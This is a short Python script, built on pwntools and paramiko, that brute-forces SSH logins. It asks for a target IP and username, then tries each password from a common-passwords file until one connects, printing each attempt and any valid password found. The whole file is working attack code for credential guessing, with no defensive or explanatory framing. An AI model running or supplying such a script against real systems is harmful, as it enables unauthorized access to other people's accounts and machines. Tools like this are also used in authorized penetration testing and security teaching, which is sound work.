from pwn import *
import paramiko

host=input("enter the IP address to be tested: ")
username=input(str("Please enter a username: "))
attempt=0

with open("Brute force/commonPasswords.txt", 'r') as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: {}".format(attempt,password))
            response = ssh(host=host, user=username, password=password)
            if response.connected():
                print("[>] Valid password found : '{}'".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempt+= 1